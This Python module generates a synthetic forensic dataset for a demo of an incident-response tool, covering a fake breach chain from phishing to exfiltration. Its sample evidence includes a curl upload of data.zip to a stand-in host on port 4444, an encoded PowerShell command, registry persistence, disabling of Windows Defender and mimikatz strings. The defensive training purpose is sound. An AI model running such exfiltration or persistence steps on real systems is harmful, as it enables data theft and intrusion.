"""Deterministic SYNTHETIC forensic dataset generator (demo / judge walkthrough).

Everything produced here is clearly labelled SYNTHETIC in the UI and in every
evidence row (provenance column). The pcap written is a real, parseable pcap file.
"""
from __future__ import annotations

import json
from pathlib import Path

from app.collectors.pcap_parser import write_pcap

BASE_TS = "2026-09-26T10:{:02d}:{:02d}+00:00"


def _ts(minute: int, second: int) -> str:
    return BASE_TS.format(minute, second)


def _epoch(minute: int, second: int) -> float:
    return 1790704800 + minute * 60 + second  # fixed epoch for 2026-09-26T10:00:00Z


def generate_dataset(dest: Path, rng_seed: int = 26148) -> dict:
    dest.mkdir(parents=True, exist_ok=True)

    users = [
        {"username": "svc_backup", "uid": 1001, "gid": 1001, "home": "/home/svc_backup", "shell": "/bin/bash", "last_login": _ts(2, 10), "groups": ["backup", "users"]},
        {"username": "j.alice", "uid": 1000, "gid": 1000, "home": "/home/j.alice", "shell": "/bin/bash", "last_login": _ts(0, 5), "groups": ["users", "investigators"]},
        {"username": "root", "uid": 0, "gid": 0, "home": "/root", "shell": "/bin/bash", "last_login": _ts(0, 1), "groups": ["root"]},
    ]

    events = []
    for i in range(8):
        events.append({"event_id": 4625 + i, "event_type": "login_failure", "timestamp": _ts(2 + i, 12), "source": "auth.log", "description": f"Failed password for svc_backup from 198.51.100.23 port 5{i:02d}0 ssh2", "user": "svc_backup", "pid": 800 + i})
    events.append({"event_id": 4624, "event_type": "login_success", "timestamp": _ts(12, 44), "source": "auth.log", "description": "Accepted password for svc_backup from 198.51.100.23 port 5911 ssh2", "user": "svc_backup", "pid": 899})
    events.append({"event_id": 4648, "event_type": "privilege_use", "timestamp": _ts(13, 30), "source": "auth.log", "description": "sudo: svc_backup : command=/usr/bin/install -m 755 updater.exe /tmp/updater.exe", "user": "svc_backup", "pid": 901})
    events.append({"event_id": 4698, "event_type": "persistence", "timestamp": _ts(15, 2), "source": "schtasks", "description": "Scheduled task 'UpdaterSvc' created pointing to C:\\Temp\\updater.exe", "user": "svc_backup", "pid": 4600})
    events.append({"event_id": 4688, "event_type": "process_create", "timestamp": _ts(14, 10), "source": "sysmon", "description": "Process created: powershell.exe -enc JABwAHIAbwBjACAAPQAg...", "user": "svc_backup", "pid": 4567})
    events.append({"event_id": 5156, "event_type": "network_connect", "timestamp": _ts(16, 20), "source": "sysmon", "description": "Windows Filter Platform permitted connection to 203.0.113.9:4444", "user": "svc_backup", "pid": 4567})

    processes = [
        {"pid": 2200, "name": "outlook.exe", "cmdline": "outlook.exe", "user": "svc_backup", "parent_pid": 1800, "parent_name": "explorer.exe", "hash_sha256": "a" * 64, "started_at": _ts(0, 20), "memory_mb": 220.5, "cpu_percent": 1.2},
        {"pid": 4567, "name": "powershell.exe", "cmdline": "powershell.exe -enc JABwAHIAbwBjACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwA=", "user": "svc_backup", "parent_pid": 2200, "parent_name": "outlook.exe", "hash_sha256": "b" * 64, "started_at": _ts(14, 10), "memory_mb": 96.1, "cpu_percent": 12.0},
        {"pid": 4600, "name": "updater.exe", "cmdline": "C:\\Temp\\updater.exe --silent", "user": "svc_backup", "parent_pid": 4567, "parent_name": "powershell.exe", "hash_sha256": "c" * 64, "started_at": _ts(15, 0), "memory_mb": 14.3, "cpu_percent": 3.1},
        {"pid": 4700, "name": "curl.exe", "cmdline": "curl.exe -T C:\\Temp\\data.zip http://203.0.113.9:4444/up", "user": "svc_backup", "parent_pid": 4600, "parent_name": "updater.exe", "hash_sha256": "d" * 64, "started_at": _ts(16, 15), "memory_mb": 4.2, "cpu_percent": 8.4},
    ]

    files = [
        {"path": "C:\\Temp\\updater.exe", "size": 482_304, "hash_sha256": "c" * 64, "hash_md5": "c" * 32, "created_at": _ts(13, 40), "modified_at": _ts(13, 40), "accessed_at": _ts(15, 0), "permissions": "-rwxr-xr-x", "owner": "svc_backup", "is_executable": True, "_links": [{"rel": "ACCESSED_FILE", "process": {"pid": 4600, "name": "updater.exe"}}]},
        {"path": "C:\\Temp\\data.zip", "size": 5_242_880, "hash_sha256": "e" * 64, "hash_md5": "e" * 32, "created_at": _ts(16, 10), "modified_at": _ts(16, 10), "accessed_at": _ts(16, 16), "permissions": "-rw-r--r--", "owner": "svc_backup", "is_executable": False, "_links": [{"rel": "ACCESSED_FILE", "process": {"pid": 4700, "name": "curl.exe"}}]},
        {"path": "C:\\Users\\svc_backup\\Documents\\Q3-financials.xlsx", "size": 1_048_576, "hash_sha256": "f" * 64, "hash_md5": "f" * 32, "created_at": _ts(0, 30), "modified_at": _ts(9, 0), "accessed_at": _ts(16, 12), "permissions": "-rw-r--r--", "owner": "svc_backup", "is_executable": False},
    ]

    network = [
        {"src_ip": "10.0.0.5", "src_port": 49152, "dst_ip": "203.0.113.9", "dst_port": 4444, "protocol": "TCP", "state": "ESTABLISHED", "pid": 4567, "process_name": "powershell.exe", "bytes_sent": 5_242_880, "bytes_recv": 1200, "source": "dataset"},
        {"src_ip": "10.0.0.5", "src_port": 51234, "dst_ip": "198.51.100.23", "dst_port": 22, "protocol": "TCP", "state": "ESTABLISHED", "pid": 899, "process_name": "sshd", "bytes_sent": 4096, "bytes_recv": 8192, "source": "dataset"},
        {"src_ip": "10.0.0.5", "src_port": 52000, "dst_ip": "10.0.0.7", "dst_port": 445, "protocol": "TCP", "state": "SYN_SENT", "pid": 4600, "process_name": "updater.exe", "bytes_sent": 512, "bytes_recv": 0, "source": "dataset"},
        {"src_ip": "10.0.0.5", "src_port": 53001, "dst_ip": "10.0.0.2", "dst_port": 53, "protocol": "UDP", "state": "STATELESS", "pid": 1200, "process_name": "svchost.exe", "bytes_sent": 64, "bytes_recv": 128, "dns_query": "cdn-update.ngrok.io", "source": "dataset"},
    ]

    registry = [
        {"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterSvc", "value": "C:\\Temp\\updater.exe", "modified_at": _ts(15, 2), "_links": [{"process": {"pid": 4600, "name": "updater.exe"}}]},
        {"key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\\Start", "value": 4, "modified_at": _ts(15, 4)},
    ]

    browser = [
        {"kind": "download", "url": "http://phish.example.top/updater.exe", "title": "Q3 bonus statement.exe", "visited_at": _ts(13, 35), "user": "svc_backup"},
        {"kind": "history", "url": "http://phish.example.top/login", "title": "Corporate portal sign-in", "visited_at": _ts(13, 30), "user": "svc_backup"},
        {"kind": "history", "url": "https://intranet.corp/finance/q3", "title": "Finance Q3", "visited_at": _ts(9, 0), "user": "svc_backup"},
    ]

    memory = [
        {"kind": "strings", "description": "unbacked RWX memory section in updater.exe at 0x7ff4...; strings: mimikatz, sekurlsa, logonpasswords", "region": "0x7ff40000", "captured_at": _ts(20, 0)},
        {"kind": "handles", "description": "handle to LSASS process from updater.exe (PID 4600)", "captured_at": _ts(20, 1)},
    ]

    pcap_packets = [
        {"ts": _epoch(16, 20), "src_ip": "10.0.0.5", "dst_ip": "203.0.113.9", "src_port": 49152, "dst_port": 4444, "protocol": "TCP"},
        {"ts": _epoch(16, 21), "src_ip": "10.0.0.5", "dst_ip": "203.0.113.9", "src_port": 49152, "dst_port": 4444, "protocol": "TCP"},
        {"ts": _epoch(16, 10), "src_ip": "10.0.0.5", "dst_ip": "10.0.0.2", "src_port": 53001, "dst_port": 53, "protocol": "UDP", "dns_query": "cdn-update.ngrok.io"},
        {"ts": _epoch(12, 44), "src_ip": "198.51.100.23", "dst_ip": "10.0.0.5", "src_port": 5911, "dst_port": 22, "protocol": "TCP"},
    ]

    zeek_lines = [
        "#separator \\x09",
        "#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	conn_state	orig_bytes	resp_bytes",
        "1790705780.0	C1\t10.0.0.5\t49152\t203.0.113.9\t4444\ttcp\tSF\t5242880\t1200",
        "1790705204.0	C2\t198.51.100.23\t5911\t10.0.0.5\t22\ttcp\tSF\t8192\t4096",
    ]

    auth_log = "\n".join(
        [f"Sep 26 10:{2 + i:02d}:12 host1 sshd[{800 + i}]: Failed password for svc_backup from 198.51.100.23 port 5{i:02d}0 ssh2" for i in range(8)]
        + ["Sep 26 10:12:44 host1 sshd[899]: Accepted password for svc_backup from 198.51.100.23 port 5911 ssh2",
           "Sep 26 10:13:30 host1 sudo[901]: svc_backup : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/install updater.exe /tmp/updater.exe"]
    )

    manifest = {
        "name": "synthetic-corp-breach",
        "provenance": "SYNTHETIC",
        "description": "Deterministic synthetic breach scenario: phishing → encoded PowerShell → dropper → persistence → C2 → exfiltration.",
        "generated_by": "ForgeX synthetic_data generator v1",
        "os": "WINDOWS",
        "seed": rng_seed,
    }

    (dest / "manifest.json").write_text(json.dumps(manifest, indent=2))
    (dest / "users.json").write_text(json.dumps(users, indent=2))
    (dest / "events.json").write_text(json.dumps(events, indent=2))
    (dest / "processes.json").write_text(json.dumps(processes, indent=2))
    (dest / "files.json").write_text(json.dumps(files, indent=2))
    (dest / "network.json").write_text(json.dumps(network, indent=2))
    (dest / "registry.json").write_text(json.dumps(registry, indent=2))
    (dest / "browser.json").write_text(json.dumps(browser, indent=2))
    (dest / "memory.json").write_text(json.dumps(memory, indent=2))
    (dest / "auth.log").write_text(auth_log)
    (dest / "zeek_conn.log").write_text("\n".join(zeek_lines))
    write_pcap(pcap_packets, dest / "capture.pcap")
    return manifest


def dataset_stats(dest: Path) -> dict:
    out = {}
    for name in ("users", "events", "processes", "files", "network", "registry", "browser", "memory"):
        p = dest / f"{name}.json"
        out[name] = len(json.loads(p.read_text())) if p.exists() else 0
    out["pcap_bytes"] = (dest / "capture.pcap").stat().st_size if (dest / "capture.pcap").exists() else 0
    return out
